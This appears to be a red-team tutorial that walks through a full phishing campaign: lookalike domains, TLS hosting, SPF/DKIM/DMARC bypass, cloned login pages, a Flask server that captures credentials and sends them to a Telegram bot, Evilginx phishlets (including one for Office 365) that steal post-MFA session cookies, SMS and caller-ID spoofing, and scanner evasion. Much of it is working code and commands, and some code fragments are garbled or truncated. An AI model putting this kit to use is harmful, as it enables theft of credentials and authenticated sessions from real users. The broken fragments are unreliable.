Phishing

Infrastructure setup, SPF/DKIM/ DMARC bypass, phishing page cloning, GoPhish campaigns, Evilginx MFA bypass, and credential capture with Flask.

Overview

Phishing is the most reliable initial access vector because it targets human trust instead of a patchable bug. This article follows the full chain: domain and hosting setup, sender authentication (SPF, DKIM, and DMARC ), lookalike login pages, credential capture, and session-token theft that defeats MFA . After reading you can stand up a lab campaign and explain each defensive countermeasure it tries to bypass.

Required Reading

  • HTTP - HTTP protocol, POST, cookies, sessions, redirects, user-agent
  • DNS - DNS records, SPF, DKIM, DMARC , MX, A, CNAME
  • TLS - TLS certificates, Let's Encrypt, certificate trust chains, SNI
  • Authentication - credential handling, MFA , session tokens, OAuth

The Attack Surface

Phishing is the most reliable initial access vector. It exploits the one vulnerability no patch can fix: human trust. A well-crafted phishing campaign succeeds not because the target is stupid but because the attacker controls the context - the email, the domain, the login page - and the human brain is optimized for pattern recognition, not security analysis.

The attack chain is five phases:

Domain & Infrastructure → Email Delivery → Landing Page → Credential Capture → MFA Bypass

Each phase has defensive countermeasures. A red team must understand each countermeasure to craft a bypass.

Phase 1 - Infrastructure Setup

Domain Registration

The phishing domain must survive initial scrutiny. A user who hovers over a link sees the domain. If it's rnicrosoft.com (rn + icrosoft), the attack fails immediately. Effective domains:

  • Cousin domains : corp-portal.com for corp.com (adds a hyphenated word)
  • TLD squatting : corp.co or corp.io when the real domain is corp.com
  • Subdomain deception : corp.com.login-portal.net (the real domain is login-portal.net )
  • Homograph attacks : Using Unicode characters that look identical to ASCII ( rp.com - Cyrillic "")
# Check domain availability
whois corp-secure.com

# Register via namecheap/godaddy API
# Namecheap example:
curl -X POST https://api.namecheap.com/xml.response \
  -d "ApiUser=username&ApiKey=key&UserName=username&Command=namecheap.domains.create&..."

# Alternative: use Njalla (privacy-focused, crypto payments)
# https://njal.la

# Verify DNS propagation after registration:
dig +short corp-secure.com @8.8.8.8
# Should return your server's IP or parking page

Hosting

The phishing server needs to be: 1. Fast (users abandon slow-loading pages) 1. Geographically appropriate (European server for European targets) 1. TLS -terminated (the padlock must appear) 1. Not on common blocklists (avoid known bulletproof hosting IP ranges) 

# VPS options (non-exhaustive):
# - DigitalOcean / Linode / Vultr: quick deploy, clean IPs
# - AWS Lightsail / EC2: massive IP space, harder to block
# - Hetzner: cheap, European IPs
# - BuyVM: allows custom ISOs, privacy-respecting

# ArchLinux server bootstrap:
ssh root@phishing-server-ip
pacman -Syu --noconfirm
pacman -S nginx certbot certbot-nginx python python-flask --noconfirm

# Firewall: allow only 80/443 and your SSH port
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -P INPUT DROP
iptables-save > /etc/iptables/iptables.rules

TLS Certificates - The Green Padlock

Modern browsers mark HTTP sites as "Not Secure." Let's Encrypt provides free, trusted certificates. Certbot automates the ACME challenge. 

# Obtain certificate (HTTP-01 challenge)
certbot certonly --standalone -d portal.corp-secure.com

# Or with nginx already running (uses webroot):
certbot certonly --webroot -w /var/www/html -d portal.corp-secure.com

# Auto-renewal cron:
echo "0 3 * * * root certbot renew --quiet && systemctl reload nginx" \
  > /etc/cron.d/certbot

# Nginx TLS configuration:
cat > /etc/nginx/sites-available/phish << 'NGINX'
server {
    listen 80;
    server_name portal.corp-secure.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name portal.corp-secure.com;

    ssl_certificate     /etc/letsencrypt/live/portal.corp-secure.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/portal.corp-secure.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    add_header Strict-Transport-Security "max-age=63072000" always;

    location / {
        proxy_pass http://127.0.0.1:5000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Prevent search engine indexing
    location /robots.txt {
        return 200 "User-agent: *\nDisallow: /\n";
    }
}

ln -s /etc/nginx/sites-available/phish /etc/nginx/sites-enabled/

Phase 2 - Email Delivery

Email delivery is the hardest part of phishing. SPF, DKIM, and DMARC exist precisely to prevent domain spoofing. Each must be understood to find bypass vectors.

SPF - Sender Policy Framework

SPF is a DNS TXT record listing the IP addresses authorized to send email for a domain. When a receiving server gets an email from user@corp.com , it checks corp.com 's SPF record to see if the sending IP is authorized. 

# Check SPF record
dig TXT corp.com +short | grep spf
# "v=spf1 ip4:192.0.2.0/24 include:_spf.google.com ~all"

# SPF qualifiers:
# +    PASS (explicit, rarely written)
# -    FAIL (hardfail — reject the email)
# ~    SOFTFAIL (accept but mark as spam)
# ?    NEUTRAL (no policy)
# ?all  = SPF effectively disabled

# Weak SPF configuration (bypassable):
# "v=spf1 ?all"                              — accepts everything
# "v=spf1 ~all"                              — softfail only (goes to spam, not rejected)
# "v=spf1 ip4:192.0.2.0/24 ?all"            — neutral fallback for unknown IPs

SPF bypass : If the target domain uses ~all (softfail) or ?all (neutral), the email is delivered (possibly to spam). Many organizations use softfail to avoid legitimate email rejection. This is operationally useful - emails go to the Junk folder, but many users check Junk.

DKIM - DomainKeys Identified Mail

DKIM is a cryptographic signature on the email, verified against a public key in DNS . It proves the email wasn't modified in transit. DKIM does NOT verify the From header - it verifies the d= domain in the signature, which can differ from the visible From address. 

# Check DKIM record
dig TXT default._domainkey.corp.com +short
# "v=DKIM1; k=rsa; p=MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC..."

# DKIM bypass: The receiving server only rejects if both SPF AND DKIM fail
# (DMARC policy dependent). If your domain has valid DKIM, you can send as
# any user on your own domain with a valid DKIM signature.

Subdomain DKIM bypass : Purchase corp.com.email-update.net . Configure DKIM for this domain. Send email as it-support@corp.com.email-update.net . DKIM passes. The recipient sees it-support@corp.com... truncated on mobile.

DMARC Policy

DMARC ties SPF and DKIM together with a policy. It specifies what happens when both fail and where to send reports. 

# Check DMARC record
dig TXT _dmarc.corp.com +short
# "v=DMARC1; p=reject; rua=mailto:dmarc@corp.com; ruf=mailto:forensics@corp.com"

# DMARC policies:
# p=none    — monitor only, no action (logs to rua/rue)
# p=quarantine — send to spam
# p=reject  — block delivery entirely

# p=none is a green light for spoofing — emails are delivered.
# p=none with subdomain policy p=quarantine or missing sp= tag:
#   Only the organizational domain is protected. Subdomains may be open.

Email Spoofing Techniques

Technique 1: Display Name Spoofing

The display name appears instead of the email address in most clients. The actual From address is hidden behind a "via" or hidden entirely on mobile. 

# Send via swaks (Swiss Army Knife SMTP):
sudo pacman -S swaks

swaks --to victim@corp.com \
  --from "IT Support <it-support@corp-secure.com>" \
  --server smtp.gmail.com:587 \
  --auth-user your-sending-account@gmail.com \
  --auth-password "app-password" \
  --tls \
  --header "Subject: Urgent: Password Reset Required" \
  --body "Your password expires in 2 hours. Click here to keep your current password: https://portal.corp-secure.com/reset"

Technique 2: Cousin Domain

The most reliable approach: own the domain, configure SPF/DKIM/ DMARC correctly, and send legitimate email from it. The recipient's mail server sees three PASS results and delivers to the inbox. 

# DNS configuration for your phishing domain:
# SPF:
corp-secure.com TXT "v=spf1 mx -all"

# DKIM (generate keys):
opendkim-genkey -b 2048 -d corp-secure.com -s default
cat default.txt  # contains the DNS record to publish

# DMARC:
_dmarc.corp-secure.com TXT "v=DMARC1; p=none"

# MX record (for reply capability):
corp-secure.com MX 10 mail.corp-secure.com

# Verify all records:
dig TXT corp-secure.com +short
dig TXT default._domainkey.corp-secure.com +short
dig TXT _dmarc.corp-secure.com +short

Technique 3: Subdomain Takeover

A company's SPF record often includes include:_spf.google.com or similar third-party services. If any of those included domains are unregistered or have misconfigured DNS , you can inject your IP into the SPF chain by registering the unclaimed domain. 

# Check SPF includes for dangling domains:
dig TXT corp.com +short | grep -oP 'include:\K[^ ]+' > spf-includes.txt
while IFS= read -r domain; do
    whois "$domain" | grep -i "no match\|not found\|available" && \
      echo "[!] $domain is available for registration"
done < spf-includes.txt

Technique 4: Service Abuse

Some organizations use spf.protection.outlook.com in their SPF. If you can create an Office 365 tenant or abuse a misconfigured shared mailbox, your emails come from Microsoft's own IP s - SPF passes automatically.

Phase 3 - Building Phishing Pages

Cloning the Target Login Page

The most effective phishing pages are pixel-perfect replicas of the real login page. Tools for cloning: 

# SingleFile — browser extension/CLI that saves a complete page as a single HTML file
# Install browser extension or use CLI:
npm install -g single-file-cli
single-file https://login.corp.com/portal --output=corp-login.html

# HTTrack — recursive website copier
sudo pacman -S httrack
httrack https://login.corp.com/portal -O /tmp/phish-clone \
  -%v --stay-on-same-domain --disable-security-limits

# The output includes HTML, CSS, JS, images, and fonts.
# Copy to your nginx webroot:
rsync -av /tmp/phish-clone/login.corp.com/ /var/www/phish/

# Manual extraction: Save browser page as "Web Page, Complete" (Ctrl+S)
# Produces an .html file + _files/ directory with assets

Modifying the Login Form

After cloning, modify the form action to POST credentials to your capture endpoint:

# Original form:
# <form action="/portal/auth" method="POST">
#   <input name="username" ...>
#   <input name="password" ...>
# </form>

# Modified form — POSTs to your capture server:
# <form action="https://portal.corp-secure.com/capture" method="POST">
#   <input name="username" ...>
#   <input name="password" ...>
# </form>
						
#!/usr/bin/env python3
"""capture-server.py — Flask app that captures credentials and redirects victims
to the real login page (or a fake error, or a "success" page).
"""
from flask import Flask, request, redirect, render_template_string
import datetime
import json

app = Flask(__name__)
LOG_FILE = "/opt/phish/credentials.log"

def log_credential(email: str, password: str, ip: str, ua: str):
    entry = {
        "timestamp": datetime.datetime.now().isoformat(),
        "email": email,
        "password": password,
        "ip": ip,
        "user_agent": ua,
        "headers": dict(request.headers),
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

    print(f"[+] {email}:{password} | {ip} | {ua[:60]}")

FAKE_ERROR_PAGE = """
<!DOCTYPE html>
<html><head><title>Sign In</title>
<style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 100px; }
    .error { color: #d93025; background: #fce8e6; padding: 20px;
             max-width: 400px; margin: 0 auto; border-radius: 8px; }
</style></head><body>
    <div class="error">
        <h2>Temporary System Error</h2>
        <p>Our authentication system is experiencing issues. Please try again in 10 minutes.</p>
        <p>Error code: AUTH_SRV_503</p>
    </div>
</body></html>
"""

@app.route("/capture", methods=["POST"])
def capture():
    email = request.form.get("username", request.form.get("email", ""))
    password = request.form.get("password", request.form.get("passwd", ""))
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")

    if email and password:
        log_credential(email, password, ip, ua)

    # Redirect to the REAL login page (victim thinks they mistyped)
    # return redirect("https://login.corp.com/portal?error=timeout")

    # OR: Show a fake error and tell them to try later
    return FAKE_ERROR_PAGE

@app.route("/")
def index():
    return render_template_string(open("/opt/phish/index.html").read())

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

Phase 4 - Credential Capture

Credentials must be exfiltrated in real-time or near-real-time because phishing domains get taken down quickly (average lifespan: 4-12 hours).

    id INTEGER PRIMARY KEY AUTOINCREMENT,

# Option 3: Telegram bot (instant notification)
# Create bot via @BotFather, get token and chat_id

    local pass="$2"

Phase 5 - MFA Bypass with Evilginx

Traditional phishing captures only a username and password. Evilginx is a reverse proxy that captures session tokens (cookies) after the victim completes MFA . This means you don't need the password - you have a valid, authenticated session. 

# Architecture:
# Victim → https://portal.corp-secure.com (your phishing domain)
#            ↓ Evilginx reverse proxy
#            ↓ Forwards to https://login.corp.com (real site)
#            ↓ Victim enters credentials + MFA
#            ↓ Real site issues session cookie
#            ↓ Evilginx captures the cookie
#            ↓ Attacker imports cookie → authenticated session

# Install Evilginx
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Build from source:
sudo pacman -S go
cd evilginx2
go build -o evilginx

# Create a phishlet for the target:
# ~/.evilginx/phishlets/corp.yaml
cat > ~/.evilginx/phishlets/corp.yaml << 'YAML'
name: 'corp'
author: 'redteam'
min_ver: '3.0.0'

proxy_hosts:
  - { phish_sub: 'portal', orig_sub: 'login', domain: 'corp.com',
      session: true, is_landing: true, auto_filter: true }

sub_filters: []

auth_tokens:
  - domain: '.corp.com'
    keys: ['sid', 'session', 'SAMLart', 'SESSID']

auth_urls:
  - '/dashboard'
  - '/home'
  - '/mfa/verify'

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
YAML

# Configure Evilginx:
./evilginx

# Inside Evilginx console:
config domain corp-secure.com
config ip 10.0.0.5

phishlets hostname corp corp-secure.com
phishlets enable corp

lures create corp
lures edit 0 redirect_url https://login.corp.com/portal
lures get-url 0

# This outputs the phishing URL: https://portal.corp-secure.com/XXXXXX
# Each victim gets a unique lure ID for tracking

# Start the server:
# When a victim logs in and completes MFA:
# Evilginx captures the session token and displays it
sessions
# session_id  | user       | status
# abc123def   | jdoe@corp  | captured

# Export the session token for use in browser:
sessions 1
# Copy the cookie JSON → import into EditThisCookie browser extension
# Browse to login.corp.com → you're authenticated as the victim

Evilginx Phishlet Components

A phishlet is a YAML file defining how Evilginx proxies a specific application:

Field Purpose
proxy_hosts Subdomain mapping: phishing subdomain -> real subdomain
session: true Track and capture cookies from this host
is_landing: true This is the landing page (only one per phishlet)
auth_tokens Cookie names to capture
auth_urls URLs that indicate successful authentication
credentials Form field names for capturing raw credentials
sub_filters String replacements in proxied content (replace corp.com links with phishing domain)

Phishlet for O365

# ~/.evilginx/phishlets/o365.yaml
name: 'o365'
author: 'redteam'
min_ver: '3.0.0'

proxy_hosts:
  - { phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com',
      session: true, is_landing: true }
  - { phish_sub: 'www', orig_sub: 'www', domain: 'office.com',
      session: false, is_landing: false }

sub_filters:
  - { trimsuffix: '/' }
  - { hostname: 'login.microsoftonline.com', orig: 'login.microsoftonline.com',
      sub: 'login', domain: 'microsoftonline.com',
      replace: 'login.phishing-domain.com' }

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
  - domain: '.office.com'
    keys: ['RPSAuth', 'SessionId']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

SMS and Voice Phishing

SMS phishing is increasingly prevalent because SMS has no SPF/DKIM/ DMARC equivalent. Any SMS gateway can spoof sender IDs. 

# SMS gateway services (require KYC/verification):
# - Twilio (most common, pay-per-message)
# - Nexmo/Vonage
# - Plivo

# Twilio API example:
curl -X POST https://api.twilio.com/2010-04-01/Accounts/ACXXXXX/Messages.json \
  --data-urlencode "Body=Corp IT: Your password expired. Re-enable: https://corp-reset.com" \
  --data-urlencode "From=+15551234567" \
  --data-urlencode "To=+15559876543" \
  -u "ACXXXXX:auth_token"

Voice phishing (vishing) uses VoIP and caller ID spoofing: 

# SpoofCard, SpoofTel, or custom Asterisk setup
# SIP trunk providers allow setting any Caller ID

# VoIP.ms API example:
curl -X POST https://voip.ms/api/v1/rest.php \
  -d "api_username=user&api_password=pass&method=createSMS&did=5551234567&dst=5559876543&message=Emergency password reset required..."

Defensive Perspective

Understanding blue team detection mechanisms helps build better red team campaigns:

  1. Email gateways : Proofpoint, Mimecast, Barracuda scan for known phishing patterns, suspicious URLs , and domain reputation
  2. Browser protections : Google Safe Browsing blocks known phishing sites (within hours of detection)
  3. URL scanning : Microsoft Advanced Threat Protection (ATP) rewrites URLs and sandboxes them on click
  4. DMARC reports : Aggregated reports show who is attempting to spoof the domain
  5. User reports : The "Report Phishing" button in Outlook/Gmail feeds into automated analysis
  6. SSL certificate transparency logs : Certbot certificates are publicly logged; blue teams monitor these
  7. Domain registration monitoring : Services like DomainTools alert on similar domain registrations

Evasion Techniques

# Evade URL rewriting (Safe Links):
# 1. Use redirect chains: short URL → medium URL → phishing page
# 2. Use CAPTCHA gate before login (scanners can't solve it)
# 3. Serve benign content to known scanner IPs, phishing to real users

# CAPTCHA gate implementation (blocks automated URL sandboxing):
cat > /opt/phish/gate.html << 'HTML'
<!DOCTYPE html>
<html><head><title>Verification Required</title></head><body>
<h2>Human Verification</h2>
<p>Please complete the CAPTCHA to continue.</p>
<form method="POST" action="/gate">
    <input type="text" name="answer" placeholder="What is 2 + 2?" />
    <input type="submit" value="Continue" />
</form>
</body></html>
HTML

# Browser fingerprinting to detect headless scanners:
# - Check navigator.webdriver (true for Selenium/Puppeteer)
# - Check for missing plugins (headless browsers have none)
# - Run a JavaScript challenge that requires a real browser engine

# Redirect chains (evade single-URL detection):
# https://portal.corp-secure.com → (302) → https://tinyurl.com/xyz → (301) → actual phishing page

import flask

LOG_FILE = "/opt/phish/creds.jsonl"

TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")

def log_hit(data: dict):
    data["timestamp"] = datetime.datetime.now().isoformat()
    data["ip"] = flask.request.headers.get("X-Forwarded-For", flask.request.remote_addr)
    data["user_agent"] = flask.request.headers.get("User-Agent", "")

    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

    # Telegram notification
    if TELEGRAM_TOKEN:
        msg = f"[Phish] {data.get('email')}:{data.get('password')} from {data['ip']}"
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            data={"chat_id": TELEGRAM_CHAT_ID, "text": msg}, timeout=5)

    print(json.dumps(data, indent=2))

def login():
    email = flask.request.form.get("username", "")

        "email": email,
        "password": password,
        "fingerprint": fingerprint,

Advanced Evasion - CAPTCHA Before Login

Automated URL sandboxing (Microsoft Safe Links, Proofpoint URL Defense) follows links and screenshots the page. A CAPTCHA before the login form blocks automated scanners while human victims pass through. 

@app.route("/")
def gate():
    """CAPTCHA gate — blocks automated scanners"""
    if flask.request.args.get("token") == "verified":
        return flask.render_template_string(CORP_LOGIN_PAGE, error="")

Troubleshooting

Issue : Emails going to spam despite valid SPF/DKIM Fix : New domains have no reputation. "Warm up" the domain by sending benign emails for 1-2 weeks before the campaign. Use a dedicated IP (not shared hosting) and gradually increase volume.

Issue : Let's Encrypt rate limit Fix : Certificates per registered domain: 50/week. Use staging environment for testing: certbot --staging . For rapid deployment, use wildcard certs.

Issue : Evilginx not capturing cookies Fix : Check the auth_tokens domain and key names. Browser DevTools -> Application -> Cookies shows the exact cookie domain and name. The phishlet must match exactly (including leading dot for subdomain cookies).

Issue : GoPhish landing page 404s Fix : The GoPhish phish server runs on port 80 by default. Ensure nginx/apache isn't binding port 80. Or change GoPhish to port 8080 and proxy through nginx.
